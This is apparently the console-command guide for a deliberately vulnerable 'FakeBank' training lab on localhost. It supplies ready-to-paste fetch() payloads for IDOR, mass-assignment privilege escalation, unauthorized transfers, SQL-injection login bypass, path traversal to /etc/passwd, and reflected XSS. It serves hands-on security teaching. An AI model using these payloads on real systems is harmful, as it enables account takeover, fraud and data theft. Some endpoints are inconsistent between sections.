# 🔒 OWASP Security Lab - Console Commands

This file contains all console commands for testing vulnerabilities in the FakeBank application.

**Prerequisites:**
1. Login as your lab player at http://localhost:3001/login (example: `test4`)
2. Open browser DevTools (F12) → Console tab
3. All commands require both `Authorization` and `X-Assigned-Vulns` headers
4. Headers are automatically retrieved from localStorage

**Important:**
- Use the same player for assignment + testing. If you switch accounts, refresh localStorage token/assignedVulns first.
- FakeBank seed users (such as `testacc`) are for bank account simulation; your lab player token controls vulnerability gating.
- Vulnerability ownership is resolved from `X-Lab-Token` when present. Keep that as your lab player token.

```javascript
// Run once before testing vuln commands
localStorage.setItem('token', localStorage.getItem('labToken') || localStorage.getItem('token') || '')
localStorage.setItem('assignedVulns', localStorage.getItem('labAssignedVulns') || localStorage.getItem('assignedVulns') || '[]')
```

---

## ✅ IDOR (Insecure Direct Object Reference) Vulnerabilities

### 1. IDOR - Account Details
Access another user's full account information by changing the user ID.

```javascript
fetch('http://localhost:5000/account/2', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

**Try with IDs:** 2, 3, 4, 5 (different users)

---

### 2. IDOR - Transaction History
View all transactions of another user.

```javascript
fetch('http://localhost:5000/transactions/2', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

### 3. IDOR - Loan Details
Access loan records belonging to other users.

```javascript
fetch('http://localhost:5000/loan/9', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

### 4. IDOR - Support Tickets
Read support tickets submitted by other users.

```javascript
fetch('http://localhost:5000/support/2', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

### 5. IDOR - Account Balance
View the balance of other user accounts.

```javascript
fetch('http://localhost:5000/balance/2', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

## 🚫 Authorization Bypass & Privilege Escalation

### 6. Missing Authentication Check - Delete User
Delete another user's account without proper authorization verification.

```javascript
fetch('http://localhost:5000/user/delete/2', {
  method: 'POST',
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns'),
    'Content-Type': 'application/json'
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

### 7. Mass Assignment - Privilege Escalation
Modify fields that should be protected (like role, is_admin, balance).

```javascript
fetch('http://localhost:5000/profile/update', {
  method: 'POST',
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns'),
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: localStorage.getItem('username'),
    role: 'admin',
    is_admin: true,
    balance: 999999
  })
}).then(r => r.json()).then(d => console.log(d))
```debug

---

### 8. Unauthorized Transfer
Transfer money from another user's account to your own.

```javascript
fetch('http://localhost:5000/transfer-exploit', {
  method: 'POST',
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns'),
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    from_user: 2,
    to_user: 1,
    amount: 5000
  })
}).then(r => r.json()).then(d => console.log(d))
```

---

### 9. Unauthorized Payee Add
Add a payee (beneficiary) to another user's account.

```javascript
fetch('http://localhost:5000/payee-exploit', {
  method: 'POST',
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns'),
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    user_id: 2,
    payee_name: 'Attacker Account',
    payee_account: '9999999999'
  })
}).then(r => r.json()).then(d => console.log(d))
```

---

### 10. Delete Payee - IDOR
Delete someone else's saved payee without authorization.

```javascript
fetch('http://localhost:5000/payee-delete/6', {
  method: 'POST',
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns'),
    'Content-Type': 'application/json'
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

## 💾 Information Disclosure

### 11. Profile Data Leak
View complete profile information of other users.

```javascript
fetch('http://localhost:5000/profile/leak/1', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

### 12. Secret Leak
Access hardcoded secrets (API keys, database passwords).

```javascript
fetch('http://localhost:5000/config', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

### 13. Debug Mode
Enable debug mode to expose sensitive information.

```javascript
fetch('http://localhost:5000/debug', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Lab-Token': localStorage.getItem('labToken') || localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

### 14. Sensitive GET Parameter
Expose user data via URL parameters that should be in the request body.

```javascript
fetch('http://localhost:5000/user/details?user_id=1', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Lab-Token': localStorage.getItem('labToken') || localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

### 15. Forced Browsing - Admin Panel
Access admin endpoints that should be restricted.

```javascript
fetch('http://localhost:5000/admin/export-users', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

## 💉 Injection Attacks

### 16. SQL Injection - Bank Login Bypass (Attacker → Victim)
Login as your lab user first (for example `test3`) so your attacker token is in localStorage, then inject a real bank username (for example `ava.thompson`) to bypass password checks.

```javascript
fetch('http://localhost:5000/bank/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': localStorage.getItem('token') || '',
    'X-Lab-Token': localStorage.getItem('labToken') || localStorage.getItem('token') || ''
  },
  body: JSON.stringify({
    username: "ava.thompson' OR '1'='1' -- ",
    password: 'anything'
  })
}).then(r => r.json()).then(d => {
  console.log(d);
  if (d.success) {
    // Keep attacker token for further vuln testing; store victim session separately if needed.
    localStorage.setItem('lastVictimToken', d.token || '');
    localStorage.setItem('lastVictimUser', d.user?.username || '');
  }
})
```

**Examples:**
- Attack ava.thompson: `username: "ava.thompson' OR '1'='1' -- "`
- Attack john.smith: `username: "john.smith' OR '1'='1' -- "`

**Behavior note:**
- SQLi completion is credited to the attacker token owner (your lab user), not the injected bank username.
- If no valid attacker token is present, SQLi on `/bank/login` is blocked with `401 Unauthorized`.
- After SQLi success, keep using your attacker token for subsequent vulnerability commands.

### 17. Path Traversal
Access files outside the intended directory using directory traversal sequences.

```javascript
fetch('http://localhost:5000/download?file=../../etc/passwd', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

### 18. Reflected XSS - Search Parameter
Inject JavaScript code in the search query.

```javascript
fetch('http://localhost:5000/search?q=<script>alert("XSS")</script>', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
})
```

**Note:** This will redirect you to a page that executes the injected script.

---

### 19. Reflected XSS - Profile Name
Inject XSS via HTML attributes.

```javascript
fetch('http://localhost:5000/profile?name=%3Cimg%20onerror=%22alert(%27XSS%27)%22%3E', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
})
```

---

## ⚙️ Security Misconfiguration

### 20. Insecure Headers
Access an endpoint that responds with insecure security headers.

```javascript
fetch('http://localhost:5000/headers-test', {
  headers: { 
    'Authorization': localStorage.getItem('token'),
    'X-Assigned-Vulns': localStorage.getItem('assignedVulns')
  }
}).then(r => r.json()).then(d => console.log(d))
```

---

## 🚀 Quick Copy-Paste Sets

### Set 1: Most Important IDORs (Test First)
```javascript
// Account IDOR
fetch('http://localhost:5000/account/2', {headers:{'Authorization':localStorage.getItem('token'),'X-Assigned-Vulns':localStorage.getItem('assignedVulns')}}).then(r=>r.json()).then(d=>console.log(d))

// Transactions IDOR
fetch('http://localhost:5000/transactions/2', {headers:{'Authorization':localStorage.getItem('token'),'X-Assigned-Vulns':localStorage.getItem('assignedVulns')}}).then(r=>r.json()).then(d=>console.log(d))

// Balance IDOR
fetch('http://localhost:5000/balance/2', {headers:{'Authorization':localStorage.getItem('token'),'X-Assigned-Vulns':localStorage.getItem('assignedVulns')}}).then(r=>r.json()).then(d=>console.log(d))
```

---

### Set 2: Information Disclosure
```javascript
// Secret Leak
fetch('http://localhost:5000/secret', {headers:{'Authorization':localStorage.getItem('token'),'X-Assigned-Vulns':localStorage.getItem('assignedVulns')}}).then(r=>r.json()).then(d=>console.log(d))

// Debug Mode
fetch('http://localhost:5000/debug', {headers:{'Authorization':localStorage.getItem('token'),'X-Assigned-Vulns':localStorage.getItem('assignedVulns')}}).then(r=>r.json()).then(d=>console.log(d))

// Admin Panel
fetch('http://localhost:5000/admin', {headers:{'Authorization':localStorage.getItem('token'),'X-Assigned-Vulns':localStorage.getItem('assignedVulns')}}).then(r=>r.json()).then(d=>console.log(d))
```

---

### Set 3: Authorization Bypass
```javascript
// Mass Assignment
fetch('http://localhost:5000/profile/update', {method:'POST',headers:{'Authorization':localStorage.getItem('token'),'X-Assigned-Vulns':localStorage.getItem('assignedVulns'),'Content-Type':'application/json'},body:JSON.stringify({username:localStorage.getItem('username'),role:'admin',is_admin:true,balance:999999})}).then(r=>r.json()).then(d=>console.log(d))

// Unauthorized Transfer
fetch('http://localhost:5000/transfer', {method:'POST',headers:{'Authorization':localStorage.getItem('token'),'X-Assigned-Vulns':localStorage.getItem('assignedVulns'),'Content-Type':'application/json'},body:JSON.stringify({from_user:2,to_user:1,amount:5000})}).then(r=>r.json()).then(d=>console.log(d))
```

---

## 📝 Important Notes

1. **User IDs to Try:** 2, 3, 4, 5, 6, etc. (change from default ID 1)
2. **Loan/Ticket IDs:** Start with 1, increment to find records
3. **Headers Required:** Both `Authorization` and `X-Assigned-Vulns` must be present
4. **Check Results:**
   - Look for `vuln_info` object in response
   - Check browser console for popup notifications
   - Visit Flags page to see captured flags
5. **POST Methods:** Some commands use `method: 'POST'` - make sure to include it
6. **Response Format:** Most commands will log the full response object

---

## 🎯 Testing Workflow

1. **Login** with your lab player (example: test4) at http://localhost:3001/login
2. **(Optional)** Login to FakeBank UI for bank simulation (bank token is separate from lab token)
3. **Open DevTools** (F12)
4. **Go to Console tab**
5. **Copy-paste a command** from above
6. **Watch for:**
   - ✅ Popup notification (vulnerability triggered)
   - ✅ Response with `vuln_info`
   - ✅ Flag appears in Flags page
7. **Try different IDs** (2, 3, 4, etc.)
8. **Track which vulnerabilities** are in your assigned list

---

## 🔍 Troubleshooting

**Getting 404 errors?**
- Make sure backend is running (`start.bat`)
- Check port 5000 is accessible
- Try a different user ID

**No popup appearing?**
- Make sure you're on FakeBank page (http://localhost:3001/fakebank)
- Wait a moment for SSE connection to establish
- Check browser console for any errors

**Header issues?**
- Make sure localStorage has `labToken` (or `token`) and `assignedVulns`
- They're stored after lab login
- Refresh page if needed

**Getting `Already exploited` on first try?**
- This usually means your current `token` belongs to a different user than the one you just assigned (token mismatch), not a bad assignment.
- Re-login as your intended lab player and refresh localStorage:

```javascript
fetch('http://localhost:5000/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'test4', password: 'YOUR_PASSWORD' })
}).then(r => r.json()).then(d => {
  console.log(d);
  if (d.success) {
    localStorage.setItem('token', d.token);
    localStorage.setItem('assignedVulns', JSON.stringify(d.assignedVulns || []));
    localStorage.setItem('username', d.user?.username || 'test4');
  }
})
```

---

**Happy Hunting! 🔐**
